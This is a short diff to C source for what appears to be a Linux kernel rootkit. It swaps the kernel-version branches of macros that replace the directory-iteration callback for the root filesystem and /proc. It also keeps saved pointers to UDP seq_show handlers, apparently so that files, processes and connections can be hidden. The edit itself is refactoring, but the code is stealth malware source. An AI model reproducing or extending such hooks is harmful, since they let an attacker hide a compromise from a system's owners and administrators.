@@ -18,18 +18,8 @@ static int (*udp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp6_seq_show)(struct seq_file *seq, void *v);
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,11,0)
-static int (*proc_iterate)(struct file *file, struct dir_context *);
-static int (*root_iterate)(struct file *file, struct dir_context *);
-#define ITERATE_NAME iterate
-#define ITERATE_PROTO struct file *file, struct dir_context *ctx
-#define FILLDIR_VAR ctx->actor
-#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)\
-{\
-    *((filldir_t*) &ctx->actor) = &FILLDIR_FUNC;\
-    ret = ITERATE_FUNC(file, ctx);\
-}
-#else
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
 static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
 static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 #define ITERATE_NAME readdir
@@ -38,6 +28,17 @@ static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 #define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)\
 {\
     ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
+}
+#else
+static int (*proc_iterate)(struct file *file, struct dir_context *);
+static int (*root_iterate)(struct file *file, struct dir_context *);
+#define ITERATE_NAME iterate
+#define ITERATE_PROTO struct file *file, struct dir_context *ctx
+#define FILLDIR_VAR ctx->actor
+#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)\
+{\
+    *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;\
+    ret = ITERATE_FUNC(file, ctx);\
 }
 #endif
 
@@ -556,7 +557,7 @@ static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t of
     return root_filldir(__buf, name, namelen, offset, ino, d_type);
 }
 
-int n_root_iterate(ITERATE_PROTO)
+int n_root_iterate ( ITERATE_PROTO )
 {
     int ret;
 
@@ -587,7 +588,7 @@ static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t of
     return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
 
-int n_proc_iterate(ITERATE_PROTO)
+int n_proc_iterate ( ITERATE_PROTO )
 {
     int ret;
 
